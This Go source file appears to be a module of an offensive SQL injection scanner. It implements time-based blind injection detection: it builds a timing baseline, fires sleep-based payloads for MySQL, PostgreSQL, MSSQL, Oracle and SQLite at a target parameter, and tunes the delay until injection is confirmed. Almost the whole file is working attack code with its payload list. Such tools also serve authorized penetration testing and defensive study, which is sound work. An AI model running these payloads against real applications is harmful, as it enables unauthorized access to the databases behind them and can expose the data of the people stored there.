package modules

import (
	"fmt"
	"math"
	"strings"
	"time"
	"hackit/sqli/go/utils"
)

// TimeAnalyzer performs advanced time-based SQL injection analysis
type TimeAnalyzer struct {
	engine EngineInterface
	log    *utils.Logger
}

// TimeProfile stores timing statistics
type TimeProfile struct {
	Baseline  time.Duration
	Threshold time.Duration
	StdDev    float64
	Samples   []time.Duration
}

func NewTimeAnalyzer(e EngineInterface) *TimeAnalyzer {
	return &TimeAnalyzer{engine: e, log: e.GetLogger()}
}

// EstablishBaseline measures normal response times
func (ta *TimeAnalyzer) EstablishBaseline(param string, samples int) *TimeProfile {
	ta.log.Info(fmt.Sprintf("Establishing time baseline (%d samples)...", samples))
	var times []time.Duration

	for i := 0; i < samples; i++ {
		body, _, _, err := ta.engine.Request("1=1", param)
		if err != nil {
			continue
		}
		times = append(times, ta.measureResponseTime(body, param))
		time.Sleep(50 * time.Millisecond)
	}

	if len(times) == 0 {
		return &TimeProfile{Baseline: 100 * time.Millisecond, Threshold: 2 * time.Second}
	}

	avg := averageDuration(times)
	stddev := stdDevDuration(times, avg)
	threshold := time.Duration(int64(avg) + 3*int64(stddev))
	if threshold < 2*time.Second {
		threshold = 2 * time.Second
	}

	return &TimeProfile{
		Baseline:  avg,
		Threshold: threshold,
		StdDev:    stddev,
		Samples:   times,
	}
}

// DetectTimeBased checks if a parameter is vulnerable to time-based injection
func (ta *TimeAnalyzer) DetectTimeBased(param, dbms string, profile *TimeProfile) (bool, float64, string) {
	// Try DBMS-specific sleep payloads
	sleepTests := []struct {
		dbms    string
		payload string
		delay   int
	}{
		{"MySQL", "' OR SLEEP(%d)-- -", 5},
		{"MySQL", "' AND SLEEP(%d)-- -", 5},
		{"MySQL", "' OR BENCHMARK(%d,MD5('test'))-- -", 5000000},
		{"PostgreSQL", "' OR pg_sleep(%d)-- -", 5},
		{"PostgreSQL", "' AND pg_sleep(%d)-- -", 5},
		{"MSSQL", "' OR WAITFOR DELAY '0:0:%d'-- -", 5},
		{"MSSQL", "' AND WAITFOR DELAY '0:0:%d'-- -", 5},
		{"Oracle", "' OR DBMS_LOCK.SLEEP(%d)-- -", 5},
		{"Oracle", "' AND DBMS_LOCK.SLEEP(%d)-- -", 5},
		{"SQLite", "' OR LIKE('abcdefg',UPPER(HEX(RANDOMBLOB(%d))))-- -", 500000000},
	}

	bestConfidence := 0.0
	bestPayload := ""

	for _, test := range sleepTests {
		if !strings.Contains(dbms, test.dbms) && dbms != "Unknown" {
			continue
		}

		payload := fmt.Sprintf(test.payload, test.delay)
		start := time.Now()
		body, _, _, err := ta.engine.Request(payload, param)
		duration := time.Since(start)

		if err != nil {
			continue
		}

		_ = body // body length check can be added

		// Calculate confidence based on actual vs expected delay
		expectedDelay := time.Duration(test.delay) * time.Second
		if test.dbms == "MySQL" && strings.Contains(test.payload, "BENCHMARK") {
			expectedDelay = 2 * time.Second
		}
		if test.dbms == "SQLite" {
			expectedDelay = 2 * time.Second
		}

		ratio := float64(duration) / float64(expectedDelay)
		confidence := math.Min(ratio, 1.0)

		if duration > profile.Threshold && ratio > 0.5 {
			if confidence > bestConfidence {
				bestConfidence = confidence
				bestPayload = payload
			}
			ta.log.Success(fmt.Sprintf("Time-based detected: %s (%.1fs, %.0f%%)",
				test.dbms, duration.Seconds(), confidence*100))
		}
	}

	if bestConfidence > 0.5 {
		ta.log.Success(fmt.Sprintf("Time-based confirmed: %.0f%% confidence", bestConfidence*100))
	}
	return bestConfidence > 0.5, bestConfidence, bestPayload
}

// PrecisionTimeTest performs multiple samples for statistical accuracy
func (ta *TimeAnalyzer) PrecisionTimeTest(param, payload string, samples int) (time.Duration, float64) {
	var times []time.Duration
	for i := 0; i < samples; i++ {
		start := time.Now()
		ta.engine.Request(payload, param)
		times = append(times, time.Since(start))
		time.Sleep(200 * time.Millisecond)
	}

	avg := averageDuration(times)
	stddev := stdDevDuration(times, avg)
	cv := stddev / float64(avg) // coefficient of variation

	return avg, cv
}

// OptimizeDelay finds the minimum reliable delay for time-based detection
func (ta *TimeAnalyzer) OptimizeDelay(param, dbms string) int {
	ta.log.Info("Optimizing time-based delay...")
	for delay := 1; delay <= 10; delay++ {
		var payload string
		switch {
		case strings.Contains(dbms, "MySQL"):
			payload = fmt.Sprintf("' OR SLEEP(%d)-- -", delay)
		case strings.Contains(dbms, "PostgreSQL"):
			payload = fmt.Sprintf("' OR pg_sleep(%d)-- -", delay)
		case strings.Contains(dbms, "MSSQL"):
			payload = fmt.Sprintf("' OR WAITFOR DELAY '0:0:%d'-- -", delay)
		default:
			payload = fmt.Sprintf("' OR SLEEP(%d)-- -", delay)
		}

		start := time.Now()
		ta.engine.Request(payload, param)
		duration := time.Since(start)

		if duration >= time.Duration(delay)*time.Second*80/100 {
			ta.log.Success(fmt.Sprintf("Optimal delay: %ds (actual: %.1fs)", delay, duration.Seconds()))
			return delay
		}
	}
	return 5 // default fallback
}

func averageDuration(times []time.Duration) time.Duration {
	if len(times) == 0 {
		return 0
	}
	var total int64
	for _, t := range times {
		total += int64(t)
	}
	return time.Duration(total / int64(len(times)))
}

func stdDevDuration(times []time.Duration, avg time.Duration) float64 {
	if len(times) < 2 {
		return 0
	}
	var sumSquares float64
	for _, t := range times {
		diff := float64(t - avg)
		sumSquares += diff * diff
	}
	return math.Sqrt(sumSquares / float64(len(times)-1))
}

func (ta *TimeAnalyzer) measureResponseTime(body string, param string) time.Duration {
	start := time.Now()
	ta.engine.Request("1=1", param)
	return time.Since(start)
}
